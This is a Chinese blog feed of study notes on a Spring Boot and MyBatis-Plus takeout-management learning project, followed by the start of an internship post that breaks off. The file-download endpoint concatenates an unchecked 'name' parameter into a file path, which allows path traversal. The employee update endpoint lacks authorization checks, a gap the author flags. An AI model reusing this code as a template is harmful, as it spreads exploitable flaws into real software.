<h3 id="员工信息分页查询"><a href="#员工信息分页查询" class="headerlink" title="员工信息分页查询"></a>员工信息分页查询</h3><h4 id="mybatis-plus插件配置"><a href="#mybatis-plus插件配置" class="headerlink" title="mybatis-plus插件配置"></a>mybatis-plus插件配置</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisPlusConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> MybatisPlusInterceptor <span class="title function_">mybatisPlusInterceptor</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">MybatisPlusInterceptor</span> <span class="variable">mybatisPlusInterceptor</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">MybatisPlusInterceptor</span>();</span><br><span class="line">        mybatisPlusInterceptor.addInnerInterceptor(<span class="keyword">new</span> <span class="title class_">PaginationInnerInterceptor</span>());</span><br><span class="line">        <span class="keyword">return</span> mybatisPlusInterceptor;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="业务代码-1"><a href="#业务代码-1" class="headerlink" title="业务代码"></a>业务代码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;/page&quot;)</span><br><span class="line">public R&lt;Page&gt; page(int page, int pageSize,String name)&#123;</span><br><span class="line">    log.info(&quot;page=&#123;&#125;,pageSize=&#123;&#125;,name=&#123;&#125;&quot;,page, pageSize, name);</span><br><span class="line">    Page pageInfo = new Page(page, pageSize);</span><br><span class="line">    LambdaQueryWrapper&lt;Employee&gt; queryWrapper = new LambdaQueryWrapper();</span><br><span class="line">    queryWrapper.like(StringUtils.isNotEmpty(name) ,Employee::getName, name);</span><br><span class="line">    queryWrapper.orderByDesc(Employee::getUpdateTime);</span><br><span class="line">    employeeService.page(pageInfo,queryWrapper);</span><br><span class="line">    return R.success(pageInfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="启用、禁用员工账号"><a href="#启用、禁用员工账号" class="headerlink" title="启用、禁用员工账号"></a>启用、禁用员工账号</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@PutMapping</span><br><span class="line">public R&lt;String&gt; update(HttpServletRequest request, @RequestBody Employee employee)&#123;</span><br><span class="line">    log.info(employee.toString());</span><br><span class="line">    Long empId = (Long) request.getSession().getAttribute(&quot;employee&quot;);</span><br><span class="line">    employee.setUpdateUser(empId);</span><br><span class="line">    employee.setUpdateTime(LocalDateTime.now());</span><br><span class="line">    employeeService.updateById(employee);</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>









<p>存在问题：前端js处理返回的id丢失精度</p>
<p><a href="https://blog.csdn.net/Mr1ght/article/details/118178664">long类型返回前端精度丢失_long类型前端丢失精度-CSDN博客</a>（阿里巴巴开发手册有，看来还是比较专业）</p>
<p>处理方法：将long统一转为字符串 <a href="https://blog.csdn.net/A1916403680/article/details/126679473">对象映射器（项目必备）_java对象映射器-CSDN博客</a></p>
<p>具体实现步骤:<br>1)提供对象转换器jackson0bjectMapper，基于jackson进行]ava对象到json数据的转换(资料中已经提供，直接复制到<br>项目中使用</p>
<p>2)在WebMvcConfig配置类中扩展Spring mvc的消息转换器，在此消息转换器中使用提供的对象转换器进行}ava对象到ison数据的转换</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xccStu.riggie.common;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.DeserializationFeature;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.<span class="keyword">module</span>.SimpleModule;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ser.std.ToStringSerializer;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.datatype.jsr310.deser.LocalDateDeserializer;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.datatype.jsr310.deser.LocalDateTimeDeserializer;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.datatype.jsr310.deser.LocalTimeDeserializer;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.datatype.jsr310.ser.LocalDateSerializer;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.datatype.jsr310.ser.LocalDateTimeSerializer;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.datatype.jsr310.ser.LocalTimeSerializer;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDate;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalTime;</span><br><span class="line"><span class="keyword">import</span> java.time.format.DateTimeFormatter;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.fasterxml.jackson.databind.DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对象映射器:基于jackson将Java对象转为json，或者将json转为Java对象</span></span><br><span class="line"><span class="comment"> * 将JSON解析为Java对象的过程称为 [从JSON反序列化Java对象]</span></span><br><span class="line"><span class="comment"> * 从Java对象生成JSON的过程称为 [序列化Java对象到JSON]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JacksonObjectMapper</span> <span class="keyword">extends</span> <span class="title class_">ObjectMapper</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_DATE_FORMAT</span> <span class="operator">=</span> <span class="string">&quot;yyyy-MM-dd&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_DATE_TIME_FORMAT</span> <span class="operator">=</span> <span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DEFAULT_TIME_FORMAT</span> <span class="operator">=</span> <span class="string">&quot;HH:mm:ss&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JacksonObjectMapper</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="comment">//收到未知属性时不报异常</span></span><br><span class="line">        <span class="built_in">this</span>.configure(FAIL_ON_UNKNOWN_PROPERTIES, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反序列化时，属性不存在的兼容处理</span></span><br><span class="line">        <span class="built_in">this</span>.getDeserializationConfig().withoutFeatures(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">SimpleModule</span> <span class="variable">simpleModule</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleModule</span>()</span><br><span class="line">                .addDeserializer(LocalDateTime.class, <span class="keyword">new</span> <span class="title class_">LocalDateTimeDeserializer</span>(DateTimeFormatter.ofPattern(DEFAULT_DATE_TIME_FORMAT)))</span><br><span class="line">                .addDeserializer(LocalDate.class, <span class="keyword">new</span> <span class="title class_">LocalDateDeserializer</span>(DateTimeFormatter.ofPattern(DEFAULT_DATE_FORMAT)))</span><br><span class="line">                .addDeserializer(LocalTime.class, <span class="keyword">new</span> <span class="title class_">LocalTimeDeserializer</span>(DateTimeFormatter.ofPattern(DEFAULT_TIME_FORMAT)))</span><br><span class="line"></span><br><span class="line">                .addSerializer(BigInteger.class, ToStringSerializer.instance)</span><br><span class="line">                .addSerializer(Long.class, ToStringSerializer.instance)</span><br><span class="line">                .addSerializer(LocalDateTime.class, <span class="keyword">new</span> <span class="title class_">LocalDateTimeSerializer</span>(DateTimeFormatter.ofPattern(DEFAULT_DATE_TIME_FORMAT)))</span><br><span class="line">                .addSerializer(LocalDate.class, <span class="keyword">new</span> <span class="title class_">LocalDateSerializer</span>(DateTimeFormatter.ofPattern(DEFAULT_DATE_FORMAT)))</span><br><span class="line">                .addSerializer(LocalTime.class, <span class="keyword">new</span> <span class="title class_">LocalTimeSerializer</span>(DateTimeFormatter.ofPattern(DEFAULT_TIME_FORMAT)));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//注册功能模块 例如，可以添加自定义序列化器和反序列化器</span></span><br><span class="line">        <span class="built_in">this</span>.registerModule(simpleModule);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>分析：可能有越权问题，普通员工猜测接口（很容易猜测接口名字太常见了）进而修改自己或者他人禁用状态或其它信息</p>
<p>todo： 如果最后视频都没有修改，尝试自己处理下。</p>
<h3 id="编辑员工信息"><a href="#编辑员工信息" class="headerlink" title="编辑员工信息"></a>编辑员工信息</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R&lt;Employee&gt; <span class="title function_">getByID</span><span class="params">(<span class="meta">@PathVariable</span> Long id)</span>&#123;</span><br><span class="line">    <span class="type">Employee</span> <span class="variable">employee</span> <span class="operator">=</span> employeeService.getById(id);</span><br><span class="line">    <span class="keyword">if</span>(employee == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> R.error(<span class="string">&quot;没有查到员工信息&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> R.success(employee);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分类管理业务-公共字段自动填充"><a href="#分类管理业务-公共字段自动填充" class="headerlink" title="分类管理业务-公共字段自动填充"></a>分类管理业务-公共字段自动填充</h3><p>实现步骤:<br>1、在实体类的属性上加入@TableField注解，指定自动填充的策略<br>2、按照框架要求编写元数据对象处理器，在此类中统一为公共字段赋值，此类需要实现MetaObjectHandler接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xccStu.riggie.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.FieldFill;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.TableField;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String phone;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String idNumber;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer status;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT)</span></span><br><span class="line">    <span class="keyword">private</span> LocalDateTime createTime;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT_UPDATE)</span></span><br><span class="line">    <span class="keyword">private</span> LocalDateTime updateTime;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT)</span></span><br><span class="line">    <span class="keyword">private</span> Long createUser;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@TableField(fill = FieldFill.INSERT_UPDATE)</span></span><br><span class="line">    <span class="keyword">private</span> Long updateUser;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>元数据对象处理器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyMetaObjecthandler</span> <span class="keyword">implements</span> <span class="title class_">MetaObjectHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertFill</span><span class="params">(MetaObject metaObject)</span> &#123;</span><br><span class="line"><span class="comment">//        log.info(&quot;自动填充&quot;);</span></span><br><span class="line"><span class="comment">//        log.info(metaObject.toString());</span></span><br><span class="line">        metaObject.setValue(<span class="string">&quot;createTime&quot;</span>, LocalDateTime.now());</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;updateTime&quot;</span>, LocalDateTime.now());</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;createUser&quot;</span>, <span class="keyword">new</span> <span class="title class_">Long</span>(<span class="number">1</span>));</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;updateUser&quot;</span>, <span class="keyword">new</span> <span class="title class_">Long</span>(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateFill</span><span class="params">(MetaObject metaObject)</span> &#123;</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;updateTime&quot;</span>, LocalDateTime.now());</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;updateUser&quot;</span>, <span class="keyword">new</span> <span class="title class_">Long</span>(<span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在问题，无法获取session对象获取修改用户id。解决方法，使用threadLocal</p>
<p>新建BaseContext类，在filter里面赋值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class BaseContext &#123;</span><br><span class="line">    private static  ThreadLocal&lt;Long&gt; threadLocal = new ThreadLocal&lt;&gt;();</span><br><span class="line">    public static void setCurrentId(Long id)&#123;</span><br><span class="line">        threadLocal.set(id);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Long getCurrentId()&#123;</span><br><span class="line">        return threadLocal.get();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (request.getSession().getAttribute(<span class="string">&quot;employee&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="type">Long</span> <span class="variable">empId</span> <span class="operator">=</span> (Long) request.getSession().getAttribute(<span class="string">&quot;employee&quot;</span>);</span><br><span class="line">    BaseContext.setCurrentId(empId);</span><br><span class="line">    filterChain.doFilter(request, response);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyMetaObjecthandler</span> <span class="keyword">implements</span> <span class="title class_">MetaObjectHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertFill</span><span class="params">(MetaObject metaObject)</span> &#123;</span><br><span class="line"><span class="comment">//        log.info(&quot;自动填充&quot;);</span></span><br><span class="line"><span class="comment">//        log.info(metaObject.toString());</span></span><br><span class="line">        metaObject.setValue(<span class="string">&quot;createTime&quot;</span>, LocalDateTime.now());</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;updateTime&quot;</span>, LocalDateTime.now());</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;createUser&quot;</span>, BaseContext.getCurrentId());</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;updateUser&quot;</span>, BaseContext.getCurrentId());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateFill</span><span class="params">(MetaObject metaObject)</span> &#123;</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;updateTime&quot;</span>, LocalDateTime.now());</span><br><span class="line">        metaObject.setValue(<span class="string">&quot;updateUser&quot;</span>, BaseContext.getCurrentId());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分类管理业务-新增分类"><a href="#分类管理业务-新增分类" class="headerlink" title="分类管理业务-新增分类"></a>分类管理业务-新增分类</h3><p>在开发业务功能前，先将需要用到的类和接口基本结构创建好:<br>实体类Category(直接从课程资料中导入即可)<br>Mapper接口CategoryMapper<br>业务层接口CategoryService<br>业务层实现类CategoryServicelmpl<br>控制层CategoryGontroller</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/category&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CategoryController</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> CategoryService categoryService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping</span></span><br><span class="line">    <span class="keyword">public</span> R&lt;String&gt; <span class="title function_">save</span><span class="params">(<span class="meta">@RequestBody</span> Category category)</span>&#123;</span><br><span class="line">        categoryService.save(category);</span><br><span class="line">        <span class="keyword">return</span> R.success(<span class="string">&quot;新增分类成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分类管理业务-分类分页查询"><a href="#分类管理业务-分类分页查询" class="headerlink" title="分类管理业务-分类分页查询"></a>分类管理业务-分类分页查询</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/page&quot;)</span></span><br><span class="line"><span class="keyword">public</span> R&lt;Page&gt; <span class="title function_">page</span><span class="params">(<span class="type">int</span> page, <span class="type">int</span> pageSize, String name)</span>&#123;</span><br><span class="line">    log.info(<span class="string">&quot;page=&#123;&#125;,pageSize=&#123;&#125;,name=&#123;&#125;&quot;</span>,page, pageSize, name);</span><br><span class="line">    Page&lt;Category&gt; pageInfo = <span class="keyword">new</span> <span class="title class_">Page</span>&lt;&gt;(page, pageSize);</span><br><span class="line">    LambdaQueryWrapper&lt;Category&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">    queryWrapper.orderByAsc(Category::getSort);</span><br><span class="line">    categoryService.page(pageInfo,queryWrapper);</span><br><span class="line">    <span class="keyword">return</span> R.success(pageInfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分类管理业务-删除分类"><a href="#分类管理业务-删除分类" class="headerlink" title="分类管理业务-删除分类"></a>分类管理业务-删除分类</h3><p>在分类管理列表页面，可以对某个分类进行删除操作。需要注意的是当分类关联了菜品或者套餐时，此分类不允许删除。</p>
<p>终于在service写逻辑了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@DeleteMapping</span></span><br><span class="line"><span class="keyword">public</span> R&lt;String&gt; <span class="title function_">delete</span><span class="params">(Long ids)</span>&#123;</span><br><span class="line">    categoryService.remove(ids);</span><br><span class="line">    <span class="keyword">return</span> R.success(<span class="string">&quot;分类信息删除成功&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>service和impl代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CategoryService</span> <span class="keyword">extends</span> <span class="title class_">IService</span>&lt;Category&gt; &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Long id)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CategoryServiceImp</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;CategoryMapper, Category&gt; <span class="keyword">implements</span> <span class="title class_">CategoryService</span> &#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> DishService dishService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> SetmealService setmealService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">        LambdaQueryWrapper&lt;Dish&gt;  dishLambdaQueryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">        dishLambdaQueryWrapper.eq(Dish::getCategoryId, id);</span><br><span class="line">        <span class="type">int</span> <span class="variable">dishCount</span> <span class="operator">=</span> dishService.count(dishLambdaQueryWrapper);</span><br><span class="line">        <span class="keyword">if</span>(dishCount &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CustomException</span>(<span class="string">&quot;当前分类下关联了菜品,不能删除&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        LambdaQueryWrapper&lt;Setmeal&gt; setmealLambdaQueryWrapper = <span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;&gt;();</span><br><span class="line">        setmealLambdaQueryWrapper.eq(Setmeal::getCategoryId, id);</span><br><span class="line">        <span class="type">int</span> <span class="variable">setmealCount</span> <span class="operator">=</span> setmealService.count(setmealLambdaQueryWrapper);</span><br><span class="line">        <span class="keyword">if</span>(setmealCount &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CustomException</span>(<span class="string">&quot;当前分类下关联了套餐,不能删除&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">super</span>.removeById(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>异常类代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomException</span> <span class="keyword">extends</span> <span class="title class_">RuntimeException</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">CustomException</span><span class="params">(String message)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>全局异常处理器对应代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ExceptionHandler(CustomException.class)</span></span><br><span class="line"><span class="keyword">public</span> R&lt;String&gt; <span class="title function_">ExceptionHandler</span><span class="params">(CustomException ex)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> R.error(ex.getMessage());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分类管理业务-更新分类"><a href="#分类管理业务-更新分类" class="headerlink" title="分类管理业务-更新分类"></a>分类管理业务-更新分类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PutMapping</span></span><br><span class="line"><span class="keyword">public</span> R&lt;String&gt; <span class="title function_">update</span><span class="params">(<span class="meta">@RequestBody</span> Category category)</span>&#123;</span><br><span class="line">    categoryService.updateById(category);</span><br><span class="line">    <span class="keyword">return</span> R.success(<span class="string">&quot;更新成功&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="文件上传下载"><a href="#文件上传下载" class="headerlink" title="文件上传下载"></a>文件上传下载</h3><p>上传</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/common&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonController</span> &#123;</span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;reggie.path&#125;&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> String basePath;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/upload&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R&lt;String&gt; <span class="title function_">upload</span><span class="params">(MultipartFile file)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">originalFilename</span> <span class="operator">=</span> file.getOriginalFilename();</span><br><span class="line">        <span class="type">String</span> <span class="variable">suffix</span> <span class="operator">=</span> originalFilename.substring(originalFilename.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">filename</span> <span class="operator">=</span> UUID.randomUUID().toString() + suffix;</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">dir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(basePath);</span><br><span class="line">        <span class="keyword">if</span>(!dir.exists())&#123;</span><br><span class="line">            dir.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            file. transferTo(<span class="keyword">new</span> <span class="title class_">File</span>(basePath + filename));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"><span class="comment">//            throw new RuntimeException(e);</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> R.error(<span class="string">&quot;上传失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> R.success(filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/download&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">download</span><span class="params">(String name, HttpServletResponse response)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(basePath + name));</span><br><span class="line">        <span class="type">ServletOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">        response.setContentType(<span class="string">&quot;image/jpeg&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ((len = fileInputStream.read(bytes)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            outputStream.write(bytes, <span class="number">0</span>, len);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">        &#125;</span><br><span class="line">        outputStream.close();</span><br><span class="line">        fileInputStream.close();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实这个写法应该是有问题的，但是因为默认文件大小不超过1024.所有不会导致问题</p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习项目</tag>
      </tags>
  </entry>
  <entry>
    <title>intership of momenta</title>
    <url>/2023/10/18/momenta_intership/</url>
    <content><![CDATA[<p>记录momenta 信息安全实习生做的事情</p>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>2023-9-29 电子科技大学网安学院拟录取，保研算是结束了。还是挺辛苦的&#x2F;(ㄒoㄒ)&#x2F;~~</p>
<p><img src="https://raw.githubusercontent.com/realikun404/p1cg0_u4e/master/imgimage-20231018213035732.png" alt="image-20231018213035732"></p>
<p>10月份国庆结束，陆陆续续投了下实习。我投的策略是测开、安全都投，因为字节有小米测开实习经历和安恒安服实习经历，所以实习找起来还相对比较顺利。</p>
<p>下面是对应的面试记录：</p>
<p><img src="https://raw.githubusercontent.com/realikun404/p1cg0_u4e/master/imgimage-20231018213250825.png" alt="image-20231018213250825"></p>
<p>值得要吐槽的是快手，在官网上10.03显示面试，但今天10.18号都没有收到任何hr的电话以及导致之前在boss上联系的其它快手测试部门都无法面试我，说必须走完正在面试的流程才能走他们的流程，巨逆天。</p>
<table>
<thead>
<tr>
<th align="center">公司</th>
<th align="center">通过</th>
<th align="center">备注</th>
